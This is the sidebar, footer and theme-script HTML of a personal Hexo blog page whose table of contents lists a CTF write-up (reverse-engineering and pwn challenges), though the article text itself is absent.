fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/photonwork" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#RE"><span class="toc-number">1.</span> <span class="toc-text">RE</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#LessEqualMore"><span class="toc-number">1.1.</span> <span class="toc-text">LessEqualMore</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PWN"><span class="toc-number">2.</span> <span class="toc-text">PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#WALL-MARIA"><span class="toc-number">2.1.</span> <span class="toc-text">WALL-MARIA</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BA%90%E7%A0%81"><span class="toc-number">2.1.1.</span> <span class="toc-text">源码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E6%96%B9%E6%B3%95"><span class="toc-number">2.1.2.</span> <span class="toc-text">调试方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">2.1.3.</span> <span class="toc-text">利用</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/08/29/%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0/" title="算法学习"><img src="https://i.loli.net/2021/10/14/GSfj5BxXTdRqg2o.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="算法学习"/></a><div class="content"><a class="title" href="/2024/08/29/%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0/" title="算法学习">算法学习</a><time datetime="2024-08-29T11:34:52.000Z" title="Created 2024-08-29 19:34:52">2024-08-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/07/31/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" title="深度学习记录"><img src="https://i.loli.net/2021/10/14/GSfj5BxXTdRqg2o.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="深度学习记录"/></a><div class="content"><a class="title" href="/2024/07/31/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" title="深度学习记录">深度学习记录</a><time datetime="2024-07-31T06:57:07.000Z" title="Created 2024-07-31 14:57:07">2024-07-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/07/29/SICP%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/" title="SICP读书笔记"><img src="https://i.loli.net/2021/10/14/GSfj5BxXTdRqg2o.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SICP读书笔记"/></a><div class="content"><a class="title" href="/2024/07/29/SICP%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/" title="SICP读书笔记">SICP读书笔记</a><time datetime="2024-07-29T03:22:55.000Z" title="Created 2024-07-29 11:22:55">2024-07-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/07/06/wsl2%E4%B8%8Evscode%E4%B8%8Brust%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/" title="wsl2与vscode下rust开发环境配置"><img src="https://i.loli.net/2021/10/14/GSfj5BxXTdRqg2o.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="wsl2与vscode下rust开发环境配置"/></a><div class="content"><a class="title" href="/2024/07/06/wsl2%E4%B8%8Evscode%E4%B8%8Brust%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/" title="wsl2与vscode下rust开发环境配置">wsl2与vscode下rust开发环境配置</a><time datetime="2024-07-06T06:56:26.000Z" title="Created 2024-07-06 14:56:26">2024-07-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/07/04/java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/" title="java动态代理"><img src="https://i.loli.net/2021/10/14/GSfj5BxXTdRqg2o.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="java动态代理"/></a><div class="content"><a class="title" href="/2024/07/04/java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/" title="java动态代理">java动态代理</a><time datetime="2024-07-04T10:32:27.000Z" title="Created 2024-07-04 18:32:27">2024-07-04</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://i.loli.net/2021/10/14/GSfj5BxXTdRqg2o.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2026 By Photon</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a><br>
<img src="https://static.dy208.cn/o_1dfilp8ruo521thr1hvf18ji17soa.png">
<a href="https://beian.miit.gov.cn/"  style="color:#f72b07" target="_blank">皖ICP备2022000759号</a></div><div class="footer_custom_text">欢迎来到光子的博客哟(●'◡'●)</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="Scroll To Comments"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>if (!window.MathJax) {
  window.MathJax = {
    tex: {
      inlineMath: [ ['$','$'], ["\\(","\\)"]],
      tags: 'ams'
    },
    chtml: {
      scale: 1.2
    },
    options: {
      renderActions: {
        findScript: [10, doc => {
          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
            const display = !!node.type.match(/; *mode=display/)
            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
            const text = document.createTextNode('')
            node.parentNode.replaceChild(text, node)
            math.start = {node: text, delim: '', n: 0}
            math.end = {node: text, delim: '', n: 0}
            doc.math.push(math)
          }
        }, ''],
        insertScript: [200, () => {
          document.querySelectorAll('mjx-container:not\([display]\)').forEach(node => {
            const target = node.parentNode
            if (target.nodeName.toLowerCase() === 'li') {
              target.parentNode.classList.add('has-jax')
            } else {
              target.classList.add('has-jax')
            }
          });
        }, '', false]
      }
    }
  }
  
  const script = document.createElement('script')
  script.src = 'https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js'
  script.id = 'MathJax-script'
  script.async = true
  document.head.appendChild(script)
} else {
  MathJax.startup.document.state(0)
  MathJax.texReset()
  MathJax.typeset()
}</script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex@latest/dist/katex.min.css"><script src="https://cdn.jsdelivr.net/npm/katex@latest/dist/contrib/copy-tex.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex@latest/dist/contrib/copy-tex.css"><script>(() => {
  document.querySelectorAll('#article-container span.katex-display').forEach(item => {
    btf.wrap(item, 'div', { class: 'katex-wrap'})
  })
})()</script><script>function loadValine () {
  function initValine () {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: 'J3nDf4qkr8OdRFaP64k2k453-gzGzoHsz',
      appKey: 'NXx6F7OYpwVWFbIQPVnw8HvN',
      placeholder: 'Please leave your footprints',
      avatar: 'monsterid',
      meta: 'nick,mail,link'.split(','),
      pageSize: '10',
      lang: 'en',
      recordIP: false,
      serverURLs: '',
      emojiCDN: '',
      emojiMaps: "",
      enableQQ: false,
      path: window.location.pathname,
      requiredFields: ["nick,mail"],
      visitor: false
    }, null))
  }

  if (typeof Valine === 'function') initValine() 
  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
}

if ('Valine' === 'Valine' || !false) {
  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
  else setTimeout(loadValine, 0)
} else {
  function loadOtherComment () {
    loadValine()
  }
}</script></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-nest.min.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"live2d-widget-model-haruto"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>